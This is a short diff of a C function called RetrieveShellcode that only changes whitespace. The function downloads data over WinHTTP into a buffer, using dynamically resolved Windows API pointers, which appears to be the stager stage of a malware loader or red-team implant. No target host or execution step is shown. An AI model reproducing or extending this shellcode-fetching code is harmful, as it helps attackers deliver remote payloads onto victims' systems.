@@ -186,9 +186,9 @@ BOOL RetrieveShellcode(
         BuffSize += BytesRead;
 
         if ( pBuffer == NULL )
-            pBuffer = DEREF_8( pLocalAlloc(LPTR, BytesRead) );
+            pBuffer = DEREF_8( pLocalAlloc( LPTR, BytesRead ) );
         else
-            pBuffer = DEREF_8( pLocalReAlloc(pBuffer, BuffSize, LMEM_MOVEABLE | LMEM_ZEROINIT) );
+            pBuffer = DEREF_8( pLocalReAlloc( pBuffer, BuffSize, LMEM_MOVEABLE | LMEM_ZEROINIT ) );
 
         if ( pBuffer == NULL ) {
             bResult = FALSE; 
@@ -197,7 +197,7 @@ BOOL RetrieveShellcode(
         }
 
         MemCopy( C_PTR( ( pBuffer + (BuffSize - BytesRead) ) ), pTemp, BytesRead ) ;
-        MemSet(pTemp, '\0', BytesRead);
+        MemSet( pTemp, '\0', BytesRead );
 
         if (BytesRead < 1024)
             break;
@@ -207,14 +207,14 @@ BOOL RetrieveShellcode(
     *pBufferRet  = pBuffer;
     *BufferSzRet = BuffSize;
 
-    pLocalFree(pTemp);
+    pLocalFree( pTemp );
 
     bResult = TRUE;
 
 _CLEANUP:
-    if (hRequest) pWinHttpCloseHandle(hRequest);
-    if (hConnect) pWinHttpCloseHandle(hConnect);
-    if (hSession) pWinHttpCloseHandle(hSession);
+    if ( hRequest ) pWinHttpCloseHandle( hRequest );
+    if ( hConnect ) pWinHttpCloseHandle( hConnect );
+    if ( hSession ) pWinHttpCloseHandle( hSession );
 
     return bResult;
 }
